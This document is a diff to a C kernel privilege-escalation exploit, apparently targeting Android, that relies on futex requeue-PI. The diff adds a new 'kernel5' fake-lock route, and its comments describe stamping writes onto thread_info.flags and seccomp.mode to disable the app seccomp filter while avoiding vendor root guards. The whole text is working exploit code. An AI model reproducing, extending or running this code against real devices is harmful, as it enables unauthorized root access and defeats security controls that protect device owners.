@@ -239,7 +239,9 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
-  if (tcp_route_selected()) {
+  if (kernel5_route_selected()) {
+    do_kernel5_fake_lock_route();
+  } else if (tcp_route_selected()) {
     do_tcp_fake_lock_route();
   } else {
     do_pselect_fake_lock_route();
@@ -1201,21 +1203,22 @@ int run_exploit(int argc, char **argv) {
      * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
      * must be zeroed too; do both writes back-to-back with one probe
      * (real finit_module calls trip vendor root guards).
-     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
-     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
-     * probe to tell [target] from [target+8]. */
+     * the mcast stamp and the tcp payload land word-aligned on the waiter base,
+     * so they stamp *(target) exactly: aim straight at thread_info.flags
+     * (task+0) / seccomp.mode. pselect's fd_set copy starts a word above that
+     * base, so its write needs the comm probe to tell [target] from [target+8]. */
     if (!process_has_seccomp()) {
       pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
       seccomp_ok = 1;
       break;
     }
 
-    int tcp_writes = tcp_route_selected();
+    int exact_write = kernel5_route_selected() || tcp_route_selected();
     struct w3_stage_context w3_context = {
       .pipes = &pipes,
       .leaf_to_target8 = 0,
     };
-    if (!tcp_writes) {
+    if (!exact_write) {
       /* a failed probe must not pick a side, guessing [target+8] would zero
        * the word before it, inside the task struct */
       if (!retry_write_stage(
